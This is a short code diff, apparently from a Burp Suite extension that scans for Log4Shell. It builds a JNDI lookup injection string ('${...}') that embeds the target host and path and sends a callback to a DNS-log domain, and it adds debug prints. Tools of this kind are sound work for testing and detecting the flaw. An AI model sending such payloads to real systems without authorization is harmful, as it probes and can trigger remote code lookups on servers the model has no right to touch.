@@ -1600,19 +1600,14 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
         if (uri.endsWith("."))
             uri = uri.substring(0,uri.length()-1);
 
-//        if (this.firstparam.equals("jndi"))
-//            this.firstparam = this.firstparam + ":";
 
         String random_str = RandomStringUtils.randomAlphanumeric(3); //生成指定长度的字母和数字的随机组合字符串
 
-//        if (!this.secondparam.contains(":"))
-//            this.secondparam = this.secondparam + ":";
-
-
-
 //        if (this.secondparam.contains("/")){
-            vulnurl = "${" + this.firstparam + this.secondparam.trim() + firstheaders[0].trim().toLowerCase() + "." + host  + uri + "." + random_str + "." + this.logxn_dnslog.trim() + "/%20user}";
-//        }else
+        vulnurl = "${" + this.firstparam + this.secondparam.trim() + firstheaders[0].trim().toLowerCase() + "." + host  + uri + "." + random_str + "." + this.logxn_dnslog.trim() + "/%20user}";
+        stdout.println(this.firstparam);
+        stdout.println(this.secondparam);
+            //        }else
 //            vulnurl = "${" + this.firstparam + this.secondparam.trim() + "//" + firstheaders[0].trim().toLowerCase() + "." + host  + uri + "." + random_str + "." + this.logxn_dnslog.trim() + "/%20user}";
 
 //        if (this.isip && this.privatedns){
